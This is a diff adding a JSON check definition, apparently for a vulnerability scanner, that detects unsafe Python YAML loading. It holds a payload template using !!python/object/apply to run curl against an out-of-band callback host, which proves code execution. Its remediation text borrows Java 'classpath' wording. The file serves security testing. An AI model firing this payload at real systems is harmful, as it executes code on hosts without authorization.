@@ -1,0 +1,20 @@
+{
+  "id": "m3-blind-deser-python-yaml-apply",
+  "bug_class": "rce",
+  "title": "Unsafe YAML load (Python !!python/object/apply RCE)",
+  "severity": "Critical",
+  "applies_when": {
+    "category": "python"
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "!!python/object/apply:subprocess.check_output [[\"curl\",\"http://{callback}\"]]"
+  },
+  "references": [
+    "CWE-502",
+    "CAPEC-586"
+  ],
+  "remediation": "Never deserialize untrusted data into arbitrary types. Use allowlist-based deserialization or a data-only format (JSON with a fixed schema), disable polymorphic type handling, and remove/patch the gadget libraries on the classpath. The inbound callback proves the gadget chain executed.",
+  "payload_family": "python-yaml"
+}
